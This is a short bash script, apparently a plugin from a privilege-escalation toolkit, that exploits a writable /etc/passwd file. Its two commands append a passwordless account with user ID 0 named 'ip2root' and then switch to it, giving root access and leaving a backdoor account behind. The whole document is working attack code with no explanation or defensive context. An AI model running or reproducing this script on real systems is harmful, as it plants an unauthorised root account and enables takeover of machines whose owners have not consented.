#!/bin/bash
# [PLUGIN PRIVESC] /etc/passwd rights exploitation

echo 'ip2root::0:0::/root:/bin/bash' >> /etc/passwd
su - ip2root
